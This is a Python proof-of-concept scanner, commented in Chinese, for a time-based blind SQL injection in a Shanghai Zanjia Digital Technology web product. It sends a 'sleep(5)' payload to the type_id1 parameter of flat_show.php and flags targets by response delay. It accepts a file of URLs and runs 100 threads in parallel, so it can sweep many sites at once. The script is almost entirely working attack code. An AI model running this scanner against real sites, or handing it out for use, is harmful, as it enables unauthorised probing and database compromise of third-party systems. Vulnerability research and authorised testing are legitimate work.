#上海赞嘉数码科技公司存在时间注入漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()
#https://www.zingut.com/

def banner():
    test = """ ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓████████▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
                                          ░▒▓█▓▒░                  
                                           ░▒▓██▓▒░                
                                                            author:CHKer
                                                            version:1.0.0
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="上海赞嘉数码科技公司存在时间注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload1 = '/flat_show.php?id=1&type_id1=1'
    payload2 = '/flat_show.php?id=1&type_id1=1 and sleep(5)--+'
    res1 = requests.get(url=target+payload1)
    res2 = requests.get(url=target+payload2)
    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()
    if time2 - time1 >= 5:
        print(f'{target}存在时间注入漏洞!')
    else:
        print(f'{target}不存在时间注入漏洞')

if __name__ == '__main__':
    main()